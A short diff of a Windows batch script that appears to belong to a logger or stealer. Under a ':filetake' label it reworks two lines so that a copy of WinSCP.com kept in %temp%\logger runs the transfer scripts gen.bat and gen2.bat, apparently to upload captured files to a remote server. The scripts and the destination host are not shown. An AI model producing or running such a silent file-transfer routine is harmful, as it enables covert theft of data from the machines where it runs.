@@ -1,4 +1,4 @@
 @echo off
 :filetake
-WinSCP.com /script=%temp%\logger\gen.bat
-WinSCP.com /script=%temp%\logger\gen2.bat
+%temp%\logger\WinSCP.com /script=%temp%\logger\gen.bat
+%temp%\logger\WinSCP.com /script=%temp%\logger\gen2.bat
